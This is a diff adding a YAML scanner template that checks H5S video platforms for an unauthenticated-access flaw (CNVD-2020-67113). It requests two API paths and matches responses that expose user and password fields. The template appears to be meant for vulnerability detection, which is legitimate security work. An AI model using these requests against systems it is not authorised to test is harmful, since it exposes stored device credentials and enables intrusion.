@@ -1,0 +1,24 @@
+id: h5s-video-platform-cnvd-2020-67113-unauth
+
+info:
+    name: h5s-video-platform-cnvd-2020-67113-unauth
+    author: iak3ec(https://github.com/nu0l)
+    severity: high
+
+manual: true
+transport: http
+rules:
+  h5s1:
+    request:
+      cache: true
+      method: GET
+      path: /api/v1/GetSrc
+    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_AUTO") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
+  h5s2:
+    request:
+      cache: true
+      method: GET
+      path: /api/v1/GetDevice
+    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_DEV") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
+expression: h5s1() || h5s2()
+
